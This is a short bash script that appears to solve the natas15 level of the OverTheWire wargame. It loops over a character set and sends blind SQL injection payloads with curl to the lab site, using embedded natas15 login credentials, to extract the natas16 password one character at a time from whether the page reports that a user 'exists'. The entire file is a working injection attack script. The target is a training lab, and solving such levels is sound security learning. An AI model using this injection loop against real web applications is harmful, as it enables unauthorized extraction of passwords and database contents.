#!/usr/bin/env bash
abc=( A B C E H I J M N O P Q R T W a b c e h i j m n o p q r t w 0 3 5 6 9 _ );
total="WaiHEacj63WnNiBRoHEQI3P9T0M5NHMH";
# WaiHEacj63WnNiBRoHEQI3P9T0M5NHMH
n=0

echo ${#abc[@]}

while [ ${#abc[@]} -gt "$n" ]; do
	i=${abc[n]}
	n=$((n+1))
	query="username=natas16\" AND password like \"$total$i\" COLLATE SQL_Latin1_General_CP1_CS_AS AND \"a\" = \"a"
	req=$(curl http://natas15.natas.labs.overthewire.org/index.php\?debug\=true -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --silent -d "$query"); 
	echo $req
	exists=$(echo $req | grep exists);
	if [ "$exists" != "" ]; then
		echo "hit: $i"
		total="$total$i"
		abc+=("$i")
		echo ${#abc[@]}
	fi
	echo "$n $total $i"
done
